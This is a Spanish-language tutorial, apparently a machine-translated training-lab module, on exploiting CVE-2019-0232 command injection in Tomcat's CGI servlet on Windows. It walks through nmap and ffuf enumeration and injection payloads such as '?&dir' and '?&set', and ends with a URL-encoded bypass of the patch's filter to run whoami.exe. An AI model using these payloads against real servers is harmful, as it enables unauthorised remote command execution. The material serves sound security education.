# Attacking Tomcat CGI

`CVE-2019-0232`es un problema de seguridad crítico que podría resultar en la ejecución de código remoto. Esta vulnerabilidad afecta a los sistemas de Windows que tienen el`enableCmdLineArguments`característica habilitada. Un atacante puede explotar esta vulnerabilidad explotando una falla de inyección de comandos resultante de un error de validación de entrada de Tomcat CGI Servlet, lo que les permite ejecutar comandos arbitrarios en el sistema afectado. Versiones`9.0.0.M1`a`9.0.17`, `8.5.0`a`8.5.39`, y`7.0.0`a`7.0.93`de Tomcat se ven afectados.

El Servlet CGI es un componente vital de Apache Tomcat que permite a los servidores web comunicarse con aplicaciones externas más allá del TomCat JVM. Estas aplicaciones externas son típicamente scripts CGI escritos en idiomas como Perl, Python o Bash. El Servlet CGI recibe solicitudes de los navegadores web y las reenvía a los scripts CGI para su procesamiento.

En esencia, un Servlet CGI es un programa que se ejecuta en un servidor web, como Apache2, para admitir la ejecución de aplicaciones externas que se ajustan a la especificación CGI. Es un middleware entre servidores web y recursos de información externa, como bases de datos.

Los scripts CGI se utilizan en sitios web por varias razones, pero también hay algunas desventajas bastante grandes para usarlos:

| **Ventajas** | **Desventajas** |
| --- | --- |
| Es simple y efectivo para generar contenido web dinámico. | Incurre en sobrecarga al tener que cargar programas en la memoria para cada solicitud. |
| Use cualquier lenguaje de programación que pueda leer desde la entrada estándar y escribir a la salida estándar. | No se puede almacenar fácilmente los datos de la memoria entre las solicitudes de la página. |
| Puede reutilizar el código existente y evitar escribir un nuevo código. | Reduce el rendimiento del servidor y consume mucho tiempo de procesamiento. |

El`enableCmdLineArguments`Configuración para el servlet CGI de Apache Tomcat controla si los argumentos de la línea de comandos se crean a partir de la cadena de consulta. Si se establece en verdadero, el CGI sirve la cadena de consulta y la pasa al script CGI como argumentos. Esta característica puede hacer que los scripts CGI sean más flexibles y más fáciles de escribir permitiendo que los parámetros se pasen al script sin usar variables de entorno o entrada estándar. Por ejemplo, un script CGI puede usar argumentos de línea de comando para cambiar entre acciones basadas en la entrada del usuario.

Supongamos que tiene un script CGI que permite a los usuarios buscar libros en el catálogo de una librería. El script tiene dos acciones posibles: "Buscar por título" y "Buscar por el autor".

El script CGI puede usar argumentos de línea de comandos para cambiar entre estas acciones. Por ejemplo, se puede llamar al script con la siguiente URL:

Código:http

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby

```

Aquí, el`action`El parámetro se establece en`title`, indicando que el script debe buscar por título del libro. El`query`El parámetro especifica el término de búsqueda "The Great Gatsby".

Si el usuario desea buscar por el autor, puede usar una URL similar:

Código:http

```
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

```

Aquí, el`action`El parámetro se establece en`author`, indicando que el script debe buscar por nombre del autor. El`query`El parámetro especifica el término de búsqueda "Fitzgerald".

Al usar argumentos de línea de comandos, el script CGI puede cambiar fácilmente entre diferentes acciones de búsqueda basadas en la entrada del usuario. Esto hace que el script sea más flexible y más fácil de usar.

Sin embargo, surge un problema cuando`enableCmdLineArguments`está habilitado en los sistemas de Windows porque el servlet CGI no puede validar correctamente la entrada del navegador web antes de pasarla al script CGI. Esto puede conducir a un ataque de inyección de comando del sistema operativo, que permite a un atacante ejecutar comandos arbitrarios en el sistema de destino inyectándolos en otro comando.

Por ejemplo, un atacante puede agregar`dir`a un comando válido usando`&`Como separador para ejecutar`dir`en un sistema de Windows. Si el atacante controla la entrada a un script CGI que usa este comando, puede inyectar sus propios comandos después de`&`para ejecutar cualquier comando en el servidor. Un ejemplo de esto es`http://example.com/cgi-bin/hello.bat?&dir`, que pasa`&dir`como argumento a`hello.bat`y ejecuta`dir`en el servidor. Como resultado, un atacante puede explotar el error de validación de entrada del servlet CGI para ejecutar cualquier comando en el servidor.

---

# **Enumeración**

Escanee el objetivo usando`nmap`, esto ayudará a determinar los servicios activos que actualmente operan en el sistema. Este proceso proporcionará información valiosa sobre el objetivo, descubriendo qué servicios y potencialmente qué versiones específicas están funcionando, lo que permite una mejor comprensión de su infraestructura y vulnerabilidades potenciales.

### **NMAP - Puertos abiertos**

Atacando a Tomcat CGI

```
xnoxos@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
Nmap scan report for 10.129.204.227
Host is up (0.17s latency).
Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey:
|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
47001/tcp open  winrm

Host script results:
| smb2-time:
|   date: 2023-03-23T11:58:42
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds

```

Aquí podemos ver que NMAP ha identificado`Apache Tomcat/9.0.17`Ejecutando en el puerto`8080`.

### **Encontrar un script CGI**

Una forma de descubrir el contenido del servidor web es utilizar el`ffuf`Herramienta de enumeración web junto con el`dirb common.txt`lista de palabras. Saber que el directorio predeterminado para los scripts CGI es`/cgi`, ya sea a través del conocimiento previo o al investigar la vulnerabilidad, podemos usar la URL`http://10.129.204.227:8080/cgi/FUZZ.cmd`o`http://10.129.204.227:8080/cgi/FUZZ.bat`para realizar fuzzing.

### **Extensiones borrosas - .cmd**

Atacando a Tomcat CGI

```
xnoxos@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```

Dado que el sistema operativo es Windows, nuestro objetivo es luchar por los scripts por lotes. Aunque la confusión para los scripts con una extensión .cmd no tiene éxito, descubrimos con éxito el archivo Welcome.bat por fuzzing para archivos con una extensión .Bat.

### **Extensiones borrosas - .Bat**

Atacando a Tomcat CGI

```
xnoxos@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::

```

Navegar por la URL descubierta en`http://10.129.204.227:8080/cgi/welcome.bat`Devuelve un mensaje:

Código:TXT

```
Welcome to CGI, this section is not functional yet. Please return to home page.

```

---

# **Explotación**

Como se discutió anteriormente, podemos explotar`CVE-2019-0232`Al agregar nuestros propios comandos mediante el uso del separador de comandos por lotes`&`. Ahora tenemos una ruta de script CGI válida descubierta durante la enumeración en`http://10.129.204.227:8080/cgi/welcome.bat`

Código:http

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir

```

Navegar a la URL anterior Devuelve la salida para el`dir`comando de lotes, sin embargo, intenta ejecutar otras aplicaciones comunes de línea de comandos de Windows, como`whoami`no devuelve una salida.

Recuperar una lista de variables ambientales llamando al`set`dominio:

Código:http

```
# http://10.129.204.227:8080/cgi/welcome.bat?&set

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat

```

De la lista, podemos ver que el`PATH`La variable ha sido inseguro, por lo que tendremos que codificar las rutas en las solicitudes:

Código:http

```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

```

El intento no tuvo éxito, y Tomcat respondió con un mensaje de error que indica que se había encontrado un carácter no válido. Apache Tomcat introdujo un parche que utiliza una expresión regular para evitar el uso de caracteres especiales. Sin embargo, el filtro se puede pasar por alto mediante la carga de la URL la carga útil.

Código:http

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```